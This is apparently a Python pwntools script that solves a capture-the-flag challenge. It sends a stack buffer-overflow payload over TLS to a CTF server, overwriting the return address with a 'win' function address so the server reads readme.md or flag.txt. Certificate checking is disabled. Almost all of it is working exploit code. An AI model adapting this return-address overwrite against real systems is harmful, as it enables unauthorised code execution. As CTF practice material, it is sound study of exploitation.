#!/usr/bin/python3
from pwn import *
import socket
import ssl
import subprocess

elf = context.binary = ELF("pwn-pas-ouf")

# offset 280

offset = b"A"*280
win = 0x4011a0

#openssl s_client -quiet -verify_quiet -connect main-5000-pwn-pas-ouf-23a9e068dbe6babf.ctf.4ts.fr:52525

# readme.md
payload = p64(0)*16 + b"readme.md" + p64(0)*17 + b"\x00"*7 + p64(win) + b"\n"

# flag.txt
payload1 = p64(0)*16 + b"flag.txt" + p64(0)*18 + p64(win) + b"\n"

def interact_with_server():
    # Define the target host and port
    # Define the target host and port
    host = "main-5000-pwn-pas-ouf-23a9e068dbe6babf.ctf.4ts.fr"
    port = 52525

    # Create a raw socket and wrap it in an SSL context
    context = ssl.create_default_context()
    
    # Optional: Disable certificate verification (similar to -verify_quiet)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE  # Don't verify server's certificate

    # Create a socket and connect to the server
    with socket.create_connection((host, port)) as sock:
        # Wrap the socket with SSL/TLS
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("SSL/TLS connection established!")
            response0 = ssock.recv(4096)  # Read up to 4096 bytes from the server
            print("Server Response0:")
            print(response0.decode())  # Decode the bytes to string for display

            # Send data (in bytes) to the server
            data_to_send = b"Your message or data here\n"  # Your data as bytes
            ssock.sendall(payload)  # Send the data
            
            # Read the response from the server
            response = ssock.recv(4096)  # Read up to 4096 bytes from the server
            print("Server Response:")
            print(response.decode())  # Decode the bytes to string for display

interact_with_server()
